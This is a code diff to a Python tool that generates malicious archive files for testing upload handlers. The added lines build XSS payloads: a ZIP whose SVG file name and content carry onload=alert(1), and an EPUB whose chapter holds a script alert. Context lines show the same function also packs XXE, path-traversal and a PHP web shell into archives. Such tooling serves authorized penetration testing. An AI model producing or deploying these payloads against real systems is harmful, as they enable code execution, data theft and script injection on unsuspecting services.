@@ -15,6 +15,8 @@ def generate_archive_payloads(output_dir, ext, burp_collab):
         path_traversal_dir.mkdir(exist_ok=True)
         rce_dir = output_dir / 'rce'
         rce_dir.mkdir(exist_ok=True)
+        xss_dir = output_dir / 'xss'
+        xss_dir.mkdir(exist_ok=True)
         
         xml_content_xxe1 = f'''<?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE root [
@@ -89,6 +91,43 @@ def generate_archive_payloads(output_dir, ext, burp_collab):
                 
                 with zipfile.ZipFile(output_file, 'w', zipfile.ZIP_DEFLATED) as zip_ref:
                     zip_ref.write(php_file, 'shell.php')
+        
+        if ext == 'zip':
+            svg_content = '<svg onload=alert(1) xmlns="http://www.w3.org/2000/svg" width="100" height="100"><rect width="100" height="100" fill="red"/></svg>'
+            output_file = xss_dir / f"xss1_filename.{ext}"
+            with tempfile.TemporaryDirectory() as temp_dir:
+                temp_path = Path(temp_dir)
+                svg_file = temp_path / "<svg onload=alert(1)>.svg"
+                svg_file.write_text(svg_content)
+                
+                with zipfile.ZipFile(output_file, 'w', zipfile.ZIP_DEFLATED) as zip_ref:
+                    zip_ref.write(svg_file, '<svg onload=alert(1)>.svg')
+        
+        if ext == 'epub':
+            xhtml_content = f'''<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<title>Test</title>
+</head>
+<body>
+<script>alert(1)</script>
+</body>
+</html>'''
+            output_file = xss_dir / f"xss1_script.{ext}"
+            with tempfile.TemporaryDirectory() as temp_dir:
+                temp_path = Path(temp_dir)
+                (temp_path / "META-INF").mkdir()
+                (temp_path / "META-INF" / "container.xml").write_text('<?xml version="1.0"?><container><rootfiles><rootfile full-path="OEBPS/content.opf" media-type="application/oebps-package+xml"/></rootfiles></container>')
+                (temp_path / "OEBPS").mkdir()
+                (temp_path / "OEBPS" / "content.opf").write_text('<?xml version="1.0"?><package xmlns="http://www.idpf.org/2007/opf" version="2.0"><metadata><dc:title xmlns:dc="http://purl.org/dc/elements/1.1/">Test</dc:title></metadata><manifest><item id="chapter1" href="chapter1.xhtml" media-type="application/xhtml+xml"/></manifest><spine><itemref idref="chapter1"/></spine></package>')
+                (temp_path / "OEBPS" / "chapter1.xhtml").write_text(xhtml_content)
+                
+                with zipfile.ZipFile(output_file, 'w', zipfile.ZIP_DEFLATED) as zip_ref:
+                    for file_path in temp_path.rglob('*'):
+                        if file_path.is_file():
+                            arcname = file_path.relative_to(temp_dir)
+                            zip_ref.write(file_path, arcname)
         
         master_file = output_dir / f"master.{ext}"
         with tempfile.TemporaryDirectory() as temp_dir:
